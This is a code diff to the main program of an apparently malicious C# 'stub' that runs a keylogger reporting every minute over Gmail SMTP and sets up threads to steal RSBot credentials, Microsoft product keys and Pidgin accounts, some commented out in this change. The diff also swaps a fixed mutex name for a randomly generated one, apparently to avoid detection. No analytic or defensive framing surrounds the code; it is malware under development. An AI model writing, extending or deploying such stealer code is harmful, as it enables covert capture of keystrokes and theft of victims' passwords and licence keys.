@@ -1,4 +1,6 @@
-﻿using System.Threading;
+﻿using System;
+using System.Text;
+using System.Threading;
 using sub.Stealers;
 using sub.Util.Threading;
 
@@ -7,6 +9,8 @@ namespace sub
     internal class Program
     {
         public static Settings Settings;
+        public static Random Random = new Random();
+
         private static void Main()
         {
             /* SettingsParser parser = new SettingsParser(Application.ExecutablePath);
@@ -21,18 +25,20 @@ namespace sub
                                         SmtpAddress = "smtp.gmail.com",
                                         SmtpPort = 587
                                     };
-
-            Variables.Mutex = new Mutex(false, Variables.MutexID, out Variables.CreatedMutex);
+            Variables.Mutex = new Mutex(false, GetKey(Random.Next(15, 26)), out Variables.CreatedMutex);
             
             StealerThread logger = new StealerThread(new Keylogger(), 1);    
             logger.Start(); //Starts a Keylogger that reports every 1 minute
             
 
             StealerThread rsbot = new StealerThread(new RSBotStealer(), -1);
-            rsbot.Start();
+            //rsbot.Start();
 
-            StealerThread productKeys = new StealerThread(new ProductKeyStealer(), -1);
-            productKeys.Start();
+            StealerThread productKeys = new StealerThread(new MicrosoftKeyStealer(), -1);
+            //productKeys.Start();
+
+            StealerThread pidgin = new StealerThread(new PidginStealer(), -1);
+            //pidgin.Start();
 
             while (true)
             {
@@ -54,6 +60,17 @@ namespace sub
                 }
                 Thread.Sleep(5000); //Sleep the main thread so the stub doesn't close
             }
+        }
+
+        public static string GetKey(int length)
+        {
+            const string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            StringBuilder sb = new StringBuilder();
+
+            while ((length--) > 0)
+                sb.Append(str[(int)(Random.NextDouble() * str.Length)]);
+
+            return sb.ToString();
         }
     }
 }
